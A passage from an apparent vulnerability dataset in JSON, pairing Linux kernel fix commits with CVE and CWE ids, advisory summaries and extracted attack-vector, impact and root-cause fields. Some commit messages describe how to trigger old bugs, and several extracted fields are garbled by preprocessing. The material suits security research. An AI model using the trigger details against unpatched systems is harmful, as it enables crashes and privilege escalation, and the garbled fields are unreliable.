Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"bfdc0b497faa82a0ba2f9dddcf109231dd519fcc","cve_id":"CVE-2011-4080","cwe_id":"CWE-264","commit_message":"sysctl: restrict write access to dmesg_restrict\n\nWhen dmesg_restrict is set to 1 CAP_SYS_ADMIN is needed to read the kernel\nring buffer.  But a root user without CAP_SYS_ADMIN is able to reset\ndmesg_restrict to 0.\n\nThis is an issue when e.g.  LXC (Linux Containers) are used and complete\nuser space is running without CAP_SYS_ADMIN.  A unprivileged and jailed\nroot user can bypass the dmesg_restrict protection.\n\nWith this patch writing to dmesg_restrict is only allowed when root has\nCAP_SYS_ADMIN.\n\nSigned-off-by: Richard Weinberger <richard@nod.at>\nAcked-by: Dan Rosenberg <drosenberg@vsecurity.com>\nAcked-by: Serge E. Hallyn <serge@hallyn.com>\nCc: Eric Paris <eparis@redhat.com>\nCc: Kees Cook <kees.cook@canonical.com>\nCc: James Morris <jmorris@namei.org>\nCc: Eugene Teo <eugeneteo@kernel.org>\nCc: <stable@kernel.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The sysrq_sysctl_handler function in kernel\/sysctl.c in the Linux kernel before 2.6.39 does not require the CAP_SYS_ADMIN capability to modify the dmesg_restrict value, which allows local users to bypass intended access restrictions and read the kernel ring buffer by leveraging root privileges, as demonstrated by a root user in a Linux Containers (aka LXC) environment.","commit_message_1":"restrict write access to dmesg_restrict when dmesg_restrict is set to <number> cap_sys_admin is needed to read the kernel ring buffer","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by leveraging root privileges , as demonstrated by a root user in a linux containers ( aka lxc ) environment","Impact":"bypass intended access restrictions and read the kernel ring buffer","Root Cause":"does not require the cap _ sys _ admin capability to modify the dmesg _ restrict value","Attack Type":"local attacker"},{"commit_id":"76597cd31470fa130784c78fadb4dab2e624a723","cve_id":"CVE-2011-3637","cwe_id":"CWE-20","commit_message":"proc: fix oops on invalid \/proc\/<pid>\/maps access\n\nWhen m_start returns an error, the seq_file logic will still call m_stop\nwith that error entry, so we'd better make sure that we check it before\nusing it as a vma.\n\nIntroduced by commit ec6fd8a4355c (\"report errors in \/proc\/*\/*map*\nsanely\"), which replaced NULL with various ERR_PTR() cases.\n\n(On ia64, you happen to get a unaligned fault instead of a page fault,\nsince the address used is generally some random error code like -EPERM)\n\nReported-by: Anca Emanuel <anca.emanuel@gmail.com>\nReported-by: Tony Luck <tony.luck@intel.com>\nCc: Al Viro <viro@zeniv.linux.org.uk>\nCc: Am\u00e9rico Wang <xiyou.wangcong@gmail.com>\nCc: Stephen Wilson <wilsons@start.ca>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The m_stop function in fs\/proc\/task_mmu.c in the Linux kernel before 2.6.39 allows local users to cause a denial of service (OOPS) via vectors that trigger an m_start error.","commit_message_1":"fix oops on invalid \/proc\/ < pid > \/maps access when m_start return an error , the seq_file logic will still call m_stop with that error entry , so we 'd better make sure that we check it before using it a a vma","Vulnerability Type":"Improper Input Validation","Attack Vector":"via vectors that trigger an m _ start error ","Impact":"cause a denial of service ( oops )","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"70945643722ffeac779d2529a348f99567fa5c33","cve_id":"CVE-2011-3363","cwe_id":"CWE-20","commit_message":"cifs: always do is_path_accessible check in cifs_mount\n\nCurrently, we skip doing the is_path_accessible check in cifs_mount if\nthere is no prefixpath. I have a report of at least one server however\nthat allows a TREE_CONNECT to a share that has a DFS referral at its\nroot. The reporter in this case was using a UNC that had no prefixpath,\nso the is_path_accessible check was not triggered and the box later hit\na BUG() because we were chasing a DFS referral on the root dentry for\nthe mount.\n\nThis patch fixes this by removing the check for a zero-length\nprefixpath.  That should make the is_path_accessible check be done in\nthis situation and should allow the client to chase the DFS referral at\nmount time instead.\n\nCc: stable@kernel.org\nReported-and-Tested-by: Yogesh Sharma <ysharma@cymer.com>\nSigned-off-by: Jeff Layton <jlayton@redhat.com>\nSigned-off-by: Steve French <sfrench@us.ibm.com>","summary":"The setup_cifs_sb function in fs\/cifs\/connect.c in the Linux kernel before 2.6.39 does not properly handle DFS referrals, which allows remote CIFS servers to cause a denial of service (system crash) by placing a referral at the root of a share.","commit_message_1":"always do is_path_accessible check in cifs_mount currently , we skip doing the is_path_accessible check in cifs_mount if there is no prefixpath","Vulnerability Type":"Improper Input Validation","Attack Vector":"by placing a referral at the root of a share ","Impact":"cause a denial of service ( system crash )","Root Cause":"does not properly handle dfs referrals","Attack Type":"remote attacker"},{"commit_id":"c85ce65ecac078ab1a1835c87c4a6319cf74660a","cve_id":"CVE-2011-3359","cwe_id":"CWE-119","commit_message":"b43: allocate receive buffers big enough for max frame len + offset\n\nOtherwise, skb_put inside of dma_rx can fail...\n\n\thttps:\/\/bugzilla.kernel.org\/show_bug.cgi?id=32042\n\nSigned-off-by: John W. Linville <linville@tuxdriver.com>\nAcked-by: Larry Finger <Larry.Finger@lwfinger.net>\nCc: stable@kernel.org","summary":"The dma_rx function in drivers\/net\/wireless\/b43\/dma.c in the Linux kernel before 2.6.39 does not properly allocate receive buffers, which allows remote attackers to cause a denial of service (system crash) via a crafted frame.","commit_message_1":"allocate receive buffer big enough for max frame len + offset otherwise , skb_put inside of dma_rx can fail","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted frame","Impact":"cause a denial of service ( system crash )","Root Cause":"does not properly allocate receive buffers","Attack Type":"remote attacker"},{"commit_id":"c2183d1e9b3f313dd8ba2b1b0197c8d9fb86a7ae","cve_id":"CVE-2011-3353","cwe_id":"CWE-119","commit_message":"fuse: check size of FUSE_NOTIFY_INVAL_ENTRY message\n\nFUSE_NOTIFY_INVAL_ENTRY didn't check the length of the write so the\nmessage processing could overrun and result in a \"kernel BUG at\nfs\/fuse\/dev.c:629!\"\n\nReported-by: Han-Wen Nienhuys <hanwenn@gmail.com>\nSigned-off-by: Miklos Szeredi <mszeredi@suse.cz>\nCC: stable@kernel.org","summary":"Buffer overflow in the fuse_notify_inval_entry function in fs\/fuse\/dev.c in the Linux kernel before 3.1 allows local users to cause a denial of service (BUG_ON and system crash) by leveraging the ability to mount a FUSE filesystem.","commit_message_1":"check size of fuse_notify_inval_entry message fuse_notify_inval_entry did n't check the length of the write so the message processing could overrun and result in a `` kernel bug at fs\/fuse\/<file> : <number> ! ''","Vulnerability Type":"buffer overflow","Attack Vector":"by leveraging the ability to mount a fuse filesystem","Impact":"cause a denial of service ( bug _ on and system crash )","Root Cause":"caused by a buffer overflow","Attack Type":"local attacker"},{"commit_id":"f8bd2258e2d520dff28c855658bd24bdafb5102d","cve_id":"CVE-2011-3209","cwe_id":"CWE-189","commit_message":"remove div_long_long_rem\n\nx86 is the only arch right now, which provides an optimized for\ndiv_long_long_rem and it has the downside that one has to be very careful that\nthe divide doesn't overflow.\n\nThe API is a little akward, as the arguments for the unsigned divide are\nsigned.  The signed version also doesn't handle a negative divisor and\nproduces worse code on 64bit archs.\n\nThere is little incentive to keep this API alive, so this converts the few\nusers to the new API.\n\nSigned-off-by: Roman Zippel <zippel@linux-m68k.org>\nCc: Ralf Baechle <ralf@linux-mips.org>\nCc: Ingo Molnar <mingo@elte.hu>\nCc: Thomas Gleixner <tglx@linutronix.de>\nCc: john stultz <johnstul@us.ibm.com>\nCc: Christoph Lameter <clameter@sgi.com>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The div_long_long_rem implementation in include\/asm-x86\/div64.h in the Linux kernel before 2.6.26 on the x86 platform allows local users to cause a denial of service (Divide Error Fault and panic) via a clock_gettime system call.","commit_message_1":"remove div_long_long_rem x86 is the only arch right now , which provides an optimized for div_long_long_rem and it ha the downside that one ha to be very careful that the divide doe n't overflow","Vulnerability Type":"Numeric Errors","Attack Vector":"via a clock _ gettime system call","Impact":"cause a denial of service ( divide error fault and panic )","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"9438fabb73eb48055b58b89fc51e0bc4db22fabd","cve_id":"CVE-2011-3191","cwe_id":"CWE-189","commit_message":"cifs: fix possible memory corruption in CIFSFindNext\n\nThe name_len variable in CIFSFindNext is a signed int that gets set to\nthe resume_name_len in the cifs_search_info. The resume_name_len however\nis unsigned and for some infolevels is populated directly from a 32 bit\nvalue sent by the server.\n\nIf the server sends a very large value for this, then that value could\nlook negative when converted to a signed int. That would make that\nvalue pass the PATH_MAX check later in CIFSFindNext. The name_len would\nthen be used as a length value for a memcpy. It would then be treated\nas unsigned again, and the memcpy scribbles over a ton of memory.\n\nFix this by making the name_len an unsigned value in CIFSFindNext.\n\nCc: <stable@kernel.org>\nReported-by: Darren Lavender <dcl@hppine99.gbr.hp.com>\nSigned-off-by: Jeff Layton <jlayton@redhat.com>\nSigned-off-by: Steve French <sfrench@us.ibm.com>","summary":"Integer signedness error in the CIFSFindNext function in fs\/cifs\/cifssmb.c in the Linux kernel before 3.1 allows remote CIFS servers to cause a denial of service (memory corruption) or possibly have unspecified other impact via a large length value in a response to a read request for a directory.","commit_message_1":"fix possible memory corruption in cifsfindnext the name_len variable in cifsfindnext is a signed int that get set to the resume_name_len in the cifs_search_info","Vulnerability Type":"Numeric Errors","Attack Vector":"via a large length value in a response to a read request for a directory","Impact":"cause a denial of service ( memory corruption ) or possibly have unspecified other impact","Root Cause":"caused by a signedness error","Attack Type":"remote attacker"},{"commit_id":"6e5714eaf77d79ae1c8b47e3e040ff5411b717ec","cve_id":"CVE-2011-3188","cwe_id":null,"commit_message":"net: Compute protocol sequence numbers and fragment IDs using MD5.\n\nComputers have become a lot faster since we compromised on the\npartial MD4 hash which we use currently for performance reasons.\n\nMD5 is a much safer choice, and is inline with both RFC1948 and\nother ISS generators (OpenBSD, Solaris, etc.)\n\nFurthermore, only having 24-bits of the sequence number be truly\nunpredictable is a very serious limitation.  So the periodic\nregeneration and 8-bit counter have been removed.  We compute and\nuse a full 32-bit sequence number.\n\nFor ipv6, DCCP was found to use a 32-bit truncated initial sequence\nnumber (it needs 43-bits) and that is fixed here as well.\n\nReported-by: Dan Kaminsky <dan@doxpara.com>\nTested-by: Willy Tarreau <w@1wt.eu>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The (1) IPv4 and (2) IPv6 implementations in the Linux kernel before 3.1 use a modified MD4 algorithm to generate sequence numbers and Fragment Identification values, which makes it easier for remote attackers to cause a denial of service (disrupted networking) or hijack network sessions by predicting these values and sending crafted packets.","commit_message_1":"compute protocol sequence number and fragment id using md5","Vulnerability Type":"disrupted networking","Attack Vector":"by predicting these values and sending crafted packets","Impact":"cause a denial of service ( disrupted networking ) or hijack network sessions","Root Cause":"use a modified md4 algorithm to generate sequence numbers and fragment identification values","Attack Type":"remote attacker"},{"commit_id":"a8b0ca17b80e92faab46ee7179ba9e99ccb61233","cve_id":"CVE-2011-2918","cwe_id":"CWE-399","commit_message":"perf: Remove the nmi parameter from the swevent and overflow interface\n\nThe nmi parameter indicated if we could do wakeups from the current\ncontext, if not, we would set some state and self-IPI and let the\nresulting interrupt do the wakeup.\n\nFor the various event classes:\n\n  - hardware: nmi=0; PMI is in fact an NMI or we run irq_work_run from\n    the PMI-tail (ARM etc.)\n  - tracepoint: nmi=0; since tracepoint could be from NMI context.\n  - software: nmi=[0,1]; some, like the schedule thing cannot\n    perform wakeups, and hence need 0.\n\nAs one can see, there is very little nmi=1 usage, and the down-side of\nnot using it is that on some platforms some software events can have a\njiffy delay in wakeup (when arch_irq_work_raise isn't implemented).\n\nThe up-side however is that we can remove the nmi parameter and save a\nbunch of conditionals in fast paths.\n\nSigned-off-by: Peter Zijlstra <a.p.zijlstra@chello.nl>\nCc: Michael Cree <mcree@orcon.net.nz>\nCc: Will Deacon <will.deacon@arm.com>\nCc: Deng-Cheng Zhu <dengcheng.zhu@gmail.com>\nCc: Anton Blanchard <anton@samba.org>\nCc: Eric B Munson <emunson@mgebm.net>\nCc: Heiko Carstens <heiko.carstens@de.ibm.com>\nCc: Paul Mundt <lethal@linux-sh.org>\nCc: David S. Miller <davem@davemloft.net>\nCc: Frederic Weisbecker <fweisbec@gmail.com>\nCc: Jason Wessel <jason.wessel@windriver.com>\nCc: Don Zickus <dzickus@redhat.com>\nLink: http:\/\/lkml.kernel.org\/n\/tip-agjev8eu666tvknpb3iaj0fg@git.kernel.org\nSigned-off-by: Ingo Molnar <mingo@elte.hu>","summary":"The Performance Events subsystem in the Linux kernel before 3.1 does not properly handle event overflows associated with PERF_COUNT_SW_CPU_CLOCK events, which allows local users to cause a denial of service (system hang) via a crafted application.","commit_message_1":"remove the nmi parameter from the swevent and overflow interface the nmi parameter indicated if we could do wakeups from the current context , if not , we would set some state and self-ipi and let the resulting interrupt do the wakeup","Vulnerability Type":"Resource Management Errors","Attack Vector":"via a crafted application","Impact":"cause a denial of service ( system hang )","Root Cause":"does not properly handle event overflows associated with perf _ count _ sw _ cpu _ clock events","Attack Type":"local attacker"},{"commit_id":"b5b515445f4f5a905c5dd27e6e682868ccd6c09d","cve_id":"CVE-2011-2906","cwe_id":"CWE-189","commit_message":"[SCSI] pmcraid: reject negative request size\n\nThere's a code path in pmcraid that can be reached via device ioctl that\ncauses all sorts of ugliness, including heap corruption or triggering the\nOOM killer due to consecutive allocation of large numbers of pages.\n\nFirst, the user can call pmcraid_chr_ioctl(), with a type\nPMCRAID_PASSTHROUGH_IOCTL.  This calls through to\npmcraid_ioctl_passthrough().  Next, a pmcraid_passthrough_ioctl_buffer\nis copied in, and the request_size variable is set to\nbuffer->ioarcb.data_transfer_length, which is an arbitrary 32-bit\nsigned value provided by the user.  If a negative value is provided\nhere, bad things can happen.  For example,\npmcraid_build_passthrough_ioadls() is called with this request_size,\nwhich immediately calls pmcraid_alloc_sglist() with a negative size.\nThe resulting math on allocating a scatter list can result in an\noverflow in the kzalloc() call (if num_elem is 0, the sglist will be\nsmaller than expected), or if num_elem is unexpectedly large the\nsubsequent loop will call alloc_pages() repeatedly, a high number of\npages will be allocated and the OOM killer might be invoked.\n\nIt looks like preventing this value from being negative in\npmcraid_ioctl_passthrough() would be sufficient.\n\nSigned-off-by: Dan Rosenberg <drosenberg@vsecurity.com>\nCc: <stable@kernel.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: James Bottomley <JBottomley@Parallels.com>","summary":"** DISPUTED ** Integer signedness error in the pmcraid_ioctl_passthrough function in drivers\/scsi\/pmcraid.c in the Linux kernel before 3.1 might allow local users to cause a denial of service (memory consumption or memory corruption) via a negative size value in an ioctl call.  NOTE: this may be a vulnerability only in unusual environments that provide a privileged program for obtaining the required file descriptor.","commit_message_1":"reject negative request size there 's a code path in pmcraid that can be reached via device ioctl that cause all sort of ugliness , including heap corruption or triggering the oom killer due to consecutive allocation of large number of page","Vulnerability Type":"Numeric Errors","Attack Vector":"via a negative size value in an ioctl call","Impact":"cause a denial of service ( memory consumption or memory corruption )","Root Cause":"caused by an integer signedness error","Attack Type":"local attacker"},{"commit_id":"13fcb7bd322164c67926ffe272846d4860196dc6","cve_id":"CVE-2011-2898","cwe_id":"CWE-264","commit_message":"af_packet: prevent information leak\n\nIn 2.6.27, commit 393e52e33c6c2 (packet: deliver VLAN TCI to userspace)\nadded a small information leak.\n\nAdd padding field and make sure its zeroed before copy to user.\n\nSigned-off-by: Eric Dumazet <eric.dumazet@gmail.com>\nCC: Patrick McHardy <kaber@trash.net>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"net\/packet\/af_packet.c in the Linux kernel before 2.6.39.3 does not properly restrict user-space access to certain packet data structures associated with VLAN Tag Control Information, which allows local users to obtain potentially sensitive information via a crafted application.","commit_message_1":"prevent information leak in <file>","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a crafted application","Impact":"obtain potentially sensitive information","Root Cause":"does not properly restrict user - space access to certain packet data structures associated with vlan tag control information","Attack Type":"local attacker"},{"commit_id":"0d0138ebe24b94065580bd2601f8bb7eb6152f56","cve_id":"CVE-2011-2707","cwe_id":"CWE-20","commit_message":"xtensa: prevent arbitrary read in ptrace\n\nPrevent an arbitrary kernel read.  Check the user pointer with access_ok()\nbefore copying data in.\n\n[akpm@linux-foundation.org: s\/EIO\/EFAULT\/]\nSigned-off-by: Dan Rosenberg <drosenberg@vsecurity.com>\nCc: Christian Zankel <chris@zankel.net>\nCc: Oleg Nesterov <oleg@redhat.com>\nCc: <stable@kernel.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The ptrace_setxregs function in arch\/xtensa\/kernel\/ptrace.c in the Linux kernel before 3.1 does not validate user-space pointers, which allows local users to obtain sensitive information from kernel memory locations via a crafted PTRACE_SETXTREGS request.","commit_message_1":"prevent arbitrary read in ptrace prevent an arbitrary kernel read","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted ptrace _ setxtregs request","Impact":"obtain sensitive information from kernel memory locations","Root Cause":"does not validate user - space pointers","Attack Type":"local attacker"},{"commit_id":"87c48fa3b4630905f98268dde838ee43626a060c","cve_id":"CVE-2011-2699","cwe_id":null,"commit_message":"ipv6: make fragment identifications less predictable\n\nIPv6 fragment identification generation is way beyond what we use for\nIPv4 : It uses a single generator. Its not scalable and allows DOS\nattacks.\n\nNow inetpeer is IPv6 aware, we can use it to provide a more secure and\nscalable frag ident generator (per destination, instead of system wide)\n\nThis patch :\n1) defines a new secure_ipv6_id() helper\n2) extends inet_getid() to provide 32bit results\n3) extends ipv6_select_ident() with a new dest parameter\n\nReported-by: Fernando Gont <fernando@gont.com.ar>\nSigned-off-by: Eric Dumazet <eric.dumazet@gmail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The IPv6 implementation in the Linux kernel before 3.1 does not generate Fragment Identification values separately for each destination, which makes it easier for remote attackers to cause a denial of service (disrupted networking) by predicting these values and sending crafted packets.","commit_message_1":"make fragment identification le predictable ipv6 fragment identification generation is way beyond what we use for ipv4 : it us a single generator","Vulnerability Type":"disrupted networking","Attack Vector":"by predicting these values and sending crafted packets","Impact":"cause a denial of service ( disrupted networking )","Root Cause":"does not generate fragment identification values separately for each destination","Attack Type":"remote attacker"},{"commit_id":"fc66c5210ec2539e800e87d7b3a985323c7be96e","cve_id":"CVE-2011-2521","cwe_id":"CWE-189","commit_message":"perf, x86: Fix Intel fixed counters base initialization\n\nThe following patch solves the problems introduced by Robert's\ncommit 41bf498 and reported by Arun Sharma. This commit gets rid\nof the base + index notation for reading and writing PMU msrs.\n\nThe problem is that for fixed counters, the new calculation for\nthe base did not take into account the fixed counter indexes,\nthus all fixed counters were read\/written from fixed counter 0.\nAlthough all fixed counters share the same config MSR, they each\nhave their own counter register.\n\nWithout:\n\n $ task -e unhalted_core_cycles -e instructions_retired -e baclears noploop 1 noploop for 1 seconds\n\n  242202299 unhalted_core_cycles (0.00% scaling, ena=1000790892, run=1000790892)\n 2389685946 instructions_retired (0.00% scaling, ena=1000790892, run=1000790892)\n      49473 baclears             (0.00% scaling, ena=1000790892, run=1000790892)\n\nWith:\n\n $ task -e unhalted_core_cycles -e instructions_retired -e baclears noploop 1 noploop for 1 seconds\n\n 2392703238 unhalted_core_cycles (0.00% scaling, ena=1000840809, run=1000840809)\n 2389793744 instructions_retired (0.00% scaling, ena=1000840809, run=1000840809)\n      47863 baclears             (0.00% scaling, ena=1000840809, run=1000840809)\n\nSigned-off-by: Stephane Eranian <eranian@google.com>\nCc: peterz@infradead.org\nCc: ming.m.lin@intel.com\nCc: robert.richter@amd.com\nCc: asharma@fb.com\nCc: perfmon2-devel@lists.sf.net\nLKML-Reference: <20110319172005.GB4978@quad>\nSigned-off-by: Ingo Molnar <mingo@elte.hu>","summary":"The x86_assign_hw_event function in arch\/x86\/kernel\/cpu\/perf_event.c in the Performance Events subsystem in the Linux kernel before 2.6.39 does not properly calculate counter values, which allows local users to cause a denial of service (panic) via the perf program.","commit_message_1":"fix intel fixed counter base initialization the following patch solves the problem introduced by robert 's commit 41bf498 and reported by arun sharma","Vulnerability Type":"Numeric Errors","Attack Vector":"via the perf program","Impact":"cause a denial of service ( panic )","Root Cause":"does not properly calculate counter values","Attack Type":"local attacker"},{"commit_id":"4e78c724d47e2342aa8fde61f6b8536f662f795f","cve_id":"CVE-2011-2518","cwe_id":"CWE-20","commit_message":"TOMOYO: Fix oops in tomoyo_mount_acl().\n\nIn tomoyo_mount_acl() since 2.6.36, kern_path() was called without checking\ndev_name != NULL. As a result, an unprivileged user can trigger oops by issuing\nmount(NULL, \"\/\", \"ext3\", 0, NULL) request.\nFix this by checking dev_name != NULL before calling kern_path(dev_name).\n\nSigned-off-by: Tetsuo Handa <penguin-kernel@I-love.SAKURA.ne.jp>\nCc: stable@kernel.org\nSigned-off-by: James Morris <jmorris@namei.org>","summary":"The tomoyo_mount_acl function in security\/tomoyo\/mount.c in the Linux kernel before 2.6.39.2 calls the kern_path function with arguments taken directly from a mount system call, which allows local users to cause a denial of service (OOPS) or possibly have unspecified other impact via a NULL value for the device name.","commit_message_1":"fix oops in tomoyo_mount_acl ( )","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a value for the device name","Impact":"cause a denial of service ( oops ) or possibly have unspecified other impact","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"208c72f4fe44fe09577e7975ba0e7fa0278f3d03","cve_id":"CVE-2011-2517","cwe_id":"CWE-119","commit_message":"nl80211: fix check for valid SSID size in scan operations\n\nIn both trigger_scan and sched_scan operations, we were checking for\nthe SSID length before assigning the value correctly.  Since the\nmemory was just kzalloc'ed, the check was always failing and SSID with\nover 32 characters were allowed to go through.\n\nThis was causing a buffer overflow when copying the actual SSID to the\nproper place.\n\nThis bug has been there since 2.6.29-rc4.\n\nCc: stable@kernel.org\nSigned-off-by: Luciano Coelho <coelho@ti.com>\nSigned-off-by: John W. Linville <linville@tuxdriver.com>","summary":"Multiple buffer overflows in net\/wireless\/nl80211.c in the Linux kernel before 2.6.39.2 allow local users to gain privileges by leveraging the CAP_NET_ADMIN capability during scan operations with a long SSID value.","commit_message_1":"fix check for valid ssid size in scan operation in both trigger_scan and sched_scan operation , we were checking for the ssid length before assigning the value correctly","Vulnerability Type":"buffer overflow","Attack Vector":"by leveraging the cap _ net _ admin capability during scan operations with a long ssid value ","Impact":"gain privileges","Root Cause":"caused by improper bounds checking by the trigger_scan and sched_scan operations","Attack Type":"local attacker"},{"commit_id":"982134ba62618c2d69fbbbd166d0a11ee3b7e3d8","cve_id":"CVE-2011-2496","cwe_id":"CWE-189","commit_message":"mm: avoid wrapping vm_pgoff in mremap()\n\nThe normal mmap paths all avoid creating a mapping where the pgoff\ninside the mapping could wrap around due to overflow.  However, an\nexpanding mremap() can take such a non-wrapping mapping and make it\nbigger and cause a wrapping condition.\n\nNoticed by Robert Swiecki when running a system call fuzzer, where it\ncaused a BUG_ON() due to terminally confusing the vma_prio_tree code.  A\nvma dumping patch by Hugh then pinpointed the crazy wrapped case.\n\nReported-and-tested-by: Robert Swiecki <robert@swiecki.net>\nAcked-by: Hugh Dickins <hughd@google.com>\nCc: stable@kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"Integer overflow in the vma_to_resize function in mm\/mremap.c in the Linux kernel before 2.6.39 allows local users to cause a denial of service (BUG_ON and system crash) via a crafted mremap system call that expands a memory mapping.","commit_message_1":"avoid wrapping vm_pgoff in mremap ( ) the normal mmap path all avoid creating a mapping where the pgoff inside the mapping could wrap around due to overflow","Vulnerability Type":"integer overflow","Attack Vector":"via a crafted mremap system call that expands a memory mapping","Impact":"cause a denial of service ( bug _ on and system crash )","Root Cause":"caused by an integer overflow","Attack Type":"local attacker"},{"commit_id":"1d1221f375c94ef961ba8574ac4f85c8870ddd51","cve_id":"CVE-2011-2495","cwe_id":"CWE-264","commit_message":"proc: restrict access to \/proc\/PID\/io\n\n\/proc\/PID\/io may be used for gathering private information.  E.g.  for\nopenssh and vsftpd daemons wchars\/rchars may be used to learn the\nprecise password length.  Restrict it to processes being able to ptrace\nthe target process.\n\nptrace_may_access() is needed to prevent keeping open file descriptor of\n\"io\" file, executing setuid binary and gathering io information of the\nsetuid'ed process.\n\nSigned-off-by: Vasiliy Kulikov <segoon@openwall.com>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"fs\/proc\/base.c in the Linux kernel before 2.6.39.4 does not properly restrict access to \/proc\/#####\/io files, which allows local users to obtain sensitive I\/O statistics by polling a file, as demonstrated by discovering the length of another user's password.","commit_message_1":"restrict access to \/proc\/pid\/io \/proc\/pid\/io may be used for gathering private information","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by discovering the length of another user's password","Impact":"obtain sensitive i \/ o statistics by polling a","Root Cause":"caused by an error","Attack Type":"attacker"},{"commit_id":"1a51410abe7d0ee4b1d112780f46df87d3621043","cve_id":"CVE-2011-2494","cwe_id":"CWE-200","commit_message":"Make TASKSTATS require root access\n\nOk, this isn't optimal, since it means that 'iotop' needs admin\ncapabilities, and we may have to work on this some more.  But at the\nsame time it is very much not acceptable to let anybody just read\nanybody elses IO statistics quite at this level.\n\nUse of the GENL_ADMIN_PERM suggested by Johannes Berg as an alternative\nto checking the capabilities by hand.\n\nReported-by: Vasiliy Kulikov <segoon@openwall.com>\nCc: Johannes Berg <johannes.berg@intel.com>\nAcked-by: Balbir Singh <bsingharora@gmail.com>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"kernel\/taskstats.c in the Linux kernel before 3.1 allows local users to obtain sensitive I\/O statistics by sending taskstats commands to a netlink socket, as demonstrated by discovering the length of another user's password.","commit_message_1":"make taskstats require root access ok , this is n't optimal , since it mean that 'iotop ' need admin capability , and we may have to work on this some more","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"by sending taskstats commands to a netlink socket , as demonstrated by discovering the length of another user ' s password","Impact":"obtain sensitive i \/ o statistics","Root Cause":"caused by improper restrictions on taskstats","Attack Type":"local attacker"},{"commit_id":"0449641130f5652b344ef6fa39fa019d7e94660a","cve_id":"CVE-2011-2493","cwe_id":null,"commit_message":"ext4: init timer earlier to avoid a kernel panic in __save_error_info\n\nDuring mount, when we fail to open journal inode or root inode, the\n__save_error_info will mod_timer. But actually s_err_report isn't\ninitialized yet and the kernel oops. The detailed information can\nbe found https:\/\/bugzilla.kernel.org\/show_bug.cgi?id=32082.\n\nThe best way is to check whether the timer s_err_report is initialized\nor not. But it seems that in include\/linux\/timer.h, we can't find a\ngood function to check the status of this timer, so this patch just\nmove the initializtion of s_err_report earlier so that we can avoid\nthe kernel panic. The corresponding del_timer is also added in the\nerror path.\n\nReported-by: Sami Liedes <sliedes@cc.hut.fi>\nSigned-off-by: Tao Ma <boyu.mt@taobao.com>\nSigned-off-by: \"Theodore Ts'o\" <tytso@mit.edu>","summary":"The ext4_fill_super function in fs\/ext4\/super.c in the Linux kernel before 2.6.39 does not properly initialize a certain error-report data structure, which allows local users to cause a denial of service (OOPS) by attempting to mount a crafted ext4 filesystem.","commit_message_1":"init timer earlier to avoid a kernel panic in __save_error_info during mount , when we fail to open journal inode or root inode , the __save_error_info will mod_timer","Vulnerability Type":"OOPS","Attack Vector":"by attempting to mount a crafted ext4 filesystem","Impact":"cause a denial of service ( oops )","Root Cause":"does not properly initialize a certain error - report data structure","Attack Type":"local attacker"},{"commit_id":"7e4ab8e1189846041f955e6c83f72bc1624e7a98","cve_id":"CVE-2011-2486","cwe_id":"CWE-264","commit_message":"Support all the new variables added","summary":"nspluginwrapper before 1.4.4 does not properly provide access to NPNVprivateModeBool variable settings, which could prevent Firefox plugins from determining if they should run in Private Browsing mode and allow remote attackers to bypass intended access restrictions, as demonstrated using Flash.","commit_message_1":"support all the new variable added","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"run in Private Browsing mode","Impact":"bypass intended access restrictions","Root Cause":"does not properly provide access to npnvprivatemodebool variable settings , which could prevent firefox plugins from determining if they should run","Attack Type":"remote attacker"},{"commit_id":"21c5977a836e399fc710ff2c5367845ed5c2527f","cve_id":"CVE-2011-2211","cwe_id":"CWE-264","commit_message":"alpha: fix several security issues\n\nFix several security issues in Alpha-specific syscalls.  Untested, but\nmostly trivial.\n\n1. Signedness issue in osf_getdomainname allows copying out-of-bounds\nkernel memory to userland.\n\n2. Signedness issue in osf_sysinfo allows copying large amounts of\nkernel memory to userland.\n\n3. Typo (?) in osf_getsysinfo bounds minimum instead of maximum copy\nsize, allowing copying large amounts of kernel memory to userland.\n\n4. Usage of user pointer in osf_wait4 while under KERNEL_DS allows\nprivilege escalation via writing return value of sys_wait4 to kernel\nmemory.\n\nSigned-off-by: Dan Rosenberg <drosenberg@vsecurity.com>\nCc: Richard Henderson <rth@twiddle.net>\nCc: Ivan Kokshaysky <ink@jurassic.park.msu.ru>\nCc: Matt Turner <mattst88@gmail.com>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The osf_wait4 function in arch\/alpha\/kernel\/osf_sys.c in the Linux kernel before 2.6.39.4 on the Alpha platform uses an incorrect pointer, which allows local users to gain privileges by writing a certain integer value to kernel memory.","commit_message_1":"fix several security issue fix several security issue in alpha-specific syscalls","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by writing a certain integer value to kernel memory","Impact":"gain privileges","Root Cause":"uses an incorrect pointer ","Attack Type":"local 